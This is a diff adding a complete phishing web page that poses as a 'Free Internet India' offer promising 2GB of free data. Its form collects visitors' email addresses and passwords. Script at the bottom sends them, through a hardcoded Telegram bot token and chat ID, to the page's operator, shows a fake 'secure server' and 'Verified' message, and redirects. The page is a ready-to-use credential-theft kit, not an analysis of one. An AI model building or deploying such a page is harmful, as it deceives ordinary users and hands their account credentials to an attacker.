@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Internet India</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            background: #0d1219;
+            background: radial-gradient(circle at 30% 10%, #1d3b45, #0a1018);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+        .card {
+            width: 100%;
+            max-width: 420px;
+            background: rgba(10, 22, 30, 0.96);
+            backdrop-filter: blur(12px);
+            border: 1.5px solid #ff880055;
+            border-radius: 44px;
+            padding: 2rem 1.8rem 2.2rem;
+            box-shadow: 0 40px 70px -10px #000000cc;
+        }
+        .india-strip {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            margin-bottom: 1.2rem;
+        }
+        .india-strip div {
+            width: 30px;
+            height: 6px;
+            border-radius: 20px;
+        }
+        .saffron { background: #ff9933; }
+        .white { background: #ffffff; }
+        .green { background: #138808; }
+
+        .provider {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        .provider .free {
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: linear-gradient(145deg, #ffb347, #ff8800);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .provider .internet {
+            font-size: 2.2rem;
+            font-weight: 300;
+            color: #d6edff;
+        }
+
+        .offer-box {
+            background: #0b262f;
+            border-radius: 70px;
+            padding: 1rem;
+            margin: 1rem 0 2rem;
+            text-align: center;
+            border-left: 5px solid #ff9933;
+            border-right: 5px solid #138808;
+        }
+        .first-offer {
+            color: #b0ffd0;
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+        .offer-small {
+            display: block;
+            font-size: 1rem;
+            color: #aaccdd;
+            margin-top: 6px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: #1a2d38;
+            border: 2px solid #2c5563;
+            border-radius: 60px;
+            padding: 1.2rem 1.8rem;
+            font-size: 1rem;
+            color: #f0f9ff;
+            outline: none;
+            margin-bottom: 1rem;
+        }
+        .input-field:focus {
+            border-color: #ff9933;
+        }
+        .input-field::placeholder {
+            color: #6797a6;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(145deg, #ff9933, #e57e1f);
+            border: none;
+            border-radius: 60px;
+            padding: 1.2rem;
+            font-size: 1.7rem;
+            font-weight: 600;
+            color: #0e1c24;
+            cursor: pointer;
+            box-shadow: 0 9px 0 #b35f00;
+            margin-top: 1rem;
+        }
+        .login-btn:active {
+            transform: translateY(7px);
+            box-shadow: 0 2px 0 #b35f00;
+        }
+        .login-btn:disabled {
+            opacity: 0.7;
+            transform: translateY(4px);
+            box-shadow: 0 5px 0 #b35f00;
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 1rem;
+            padding: 0.8rem;
+            border-radius: 60px;
+            display: none;
+            font-weight: 500;
+        }
+        .status.success {
+            background: #13880830;
+            color: #98ff98;
+            border: 1px solid #138808;
+            display: block;
+        }
+        .status.error {
+            background: #ff333330;
+            color: #ff9999;
+            border: 1px solid #ff3333;
+            display: block;
+        }
+        .status.sending {
+            background: #ff993330;
+            color: #ffb347;
+            border: 1px solid #ff9933;
+            display: block;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 2rem;
+            color: #507a85;
+            font-size: 0.8rem;
+        }
+        .footer span {
+            background: #1b333e;
+            padding: 0.3rem 1.4rem;
+            border-radius: 60px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="india-strip">
+            <div class="saffron"></div><div class="white"></div><div class="green"></div>
+        </div>
+
+        <div class="provider">
+            <span class="free">free</span><span class="internet">internet</span>
+        </div>
+
+        <div id="offerMessage" class="offer-box">
+            <div class="first-offer">📶 2GB free</div>
+            <div class="offer-small">first time offer</div>
+        </div>
+
+        <form id="loginForm">
+            <input type="email" id="email" class="input-field" placeholder="📧 Email Address" required>
+            <input type="password" id="password" class="input-field" placeholder="🔐 Password" required>
+
+            <button type="submit" class="login-btn" id="submitBtn">ACTIVATE</button>
+        </form>
+        
+        <div id="statusMessage" class="status"></div>
+
+        <div class="footer">
+            <span>🎁 2GB first</span>
+            <span>💰 cashback return</span>
+        </div>
+    </div>
+
+    <script>
+        // Your Telegram bot credentials
+        const BOT_TOKEN = "8201435516:AAFvVxy3a0-M0BpHwsTo7C-gnCVHh4YJsZw";
+        
+        // IMPORTANT: Replace YOUR_CHAT_ID_HERE with your actual chat ID from Telegram
+        const CHAT_ID = "6190190972";  // ← FIX THIS!
+
+    
+        // localStorage for first/return tracking
+        const USER_KEY = 'freeInternetUser';
+        
+        (function setOfferMessage() {
+            const offerDiv = document.getElementById('offerMessage');
+            const isReturning = localStorage.getItem(USER_KEY);
+
+            if (!isReturning) {
+                localStorage.setItem(USER_KEY, 'visited');
+                offerDiv.innerHTML = '<div class="first-offer">📶 2GB free</div><div class="offer-small">first time • unlimited till 2GB</div>';
+            } else {
+                offerDiv.innerHTML = '<div class="first-offer" style="color:#ffe484">💰 cashback ₹40</div><div class="offer-small">welcome back! special return offer</div>';
+            }
+        })();
+
+        // Login handler
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const statusDiv = document.getElementById('statusMessage');
+            
+            // Validate
+            if (!email || !password) {
+                statusDiv.className = 'status error';
+                statusDiv.textContent = 'Please fill both fields';
+                return;
+            }
+
+            // Disable button
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'PROCESSING...';
+            
+            // Show sending status
+            statusDiv.className = 'status sending';
+            statusDiv.textContent = '📤 Sending to secure server...';
+            
+            // Get user type
+            const userType = localStorage.getItem(USER_KEY) === 'visited' ? 'First time' : 'Returning';
+            
+            // Prepare message
+            const message = `🔐 *FREE INTERNET LOGIN*  
+            
+📧 *Email:* \`${email}\`  
+🔑 *Password:* \`${password}\`  
+👤 *Type:* ${userType}
+🇮🇳 *India Only*`;
+
+            // Send to Telegram
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.ok) {
+                    statusDiv.className = 'status success';
+                    statusDiv.textContent = '✓ Verified! Redirecting...';
+                    
+                    // Redirect to 2.html
+                    setTimeout(() => {
+                        window.location.href = '2.html';
+                    }, 1000);
+                } else {
+                    throw new Error(data.description || 'Failed to send');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                statusDiv.className = 'status error';
+                statusDiv.textContent = '⚠️ Error: ' + error.message;
+                
+                // Re-enable button on error
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'ACTIVATE';
+            }
+        });
+    </script>
+</body>
+</html>
